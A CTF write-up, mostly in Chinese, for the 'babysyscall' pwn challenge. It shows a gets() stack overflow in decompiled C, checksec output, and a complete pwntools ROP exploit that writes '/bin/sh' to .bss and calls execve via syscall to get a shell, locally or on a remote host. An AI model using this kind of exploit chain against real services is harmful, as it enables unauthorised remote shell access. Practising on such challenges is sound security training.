# babysyscall

反编译：

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE v4[32]; // [rsp+0h] [rbp-20h] BYREF

  IO_puts("baby syscall", argv, envp);
  IO_gets(v4);
  return 0;
}
```

checksec:

```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

静态链接了 libc，有栈溢出，可以 ROP，但是没有 system，所以需要自己调用 execve 的 syscall，同时还需要往内存（这里是 bss）写入 "/bin/sh"：

```python
from pwn import *

context(log_level="DEBUG")
context.terminal = ["tmux", "split-w", "-h"]
context.arch = "amd64"

if args.REMOTE:
    p = remote(args.HOST, args.PORT)
else:
    p = process("./babysyscall", shell=True)
elf = ELF("./babysyscall")

rop = ROP(elf)
# mov_dword_ptr_rax_rdi_pop_rbx_ret = rop.find_gadget(
#    ["mov dword ptr [rax], rdi", "pop rbx", "ret"]
# ).address
mov_dword_ptr_rax_rdi_pop_rbx_ret = 0x48D9C4
pop_rdx_pop_rbx_ret = rop.find_gadget(["pop rdx", "pop rbx", "ret"]).address
pop_rax_ret = rop.find_gadget(["pop rax", "ret"]).address
pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address
pop_rsi_ret = rop.find_gadget(["pop rsi", "ret"]).address
pop_rdx_pop_rbx_ret = rop.find_gadget(["pop rdx", "pop rbx", "ret"]).address
ret = rop.find_gadget(["ret"]).address
syscall = rop.find_gadget(["syscall"]).address


buf = elf.bss()
payload = (
    b"A" * 0x28
    # rdi = "/bin/sh\x00"
    + p64(pop_rdi_ret)
    + b"/bin/sh\x00"
    # rax = buf
    + p64(pop_rax_ret)
    + p64(buf)
    # *rax = rdi
    + p64(mov_dword_ptr_rax_rdi_pop_rbx_ret)
    + p64(0)
    # rdi = buf
    + p64(pop_rdi_ret)
    + p64(buf)
    # rax = SYS_execve
    + p64(pop_rax_ret)
    + p64(59)
    # rsi = 0
    + p64(pop_rsi_ret)
    + p64(0)
    # rdx = 0
    + p64(pop_rdx_pop_rbx_ret)
    + p64(0)
    + p64(0)
    # syscall
    + p64(syscall)
    + b"\n"
)
print(payload)
p.send(payload)
p.interactive()
```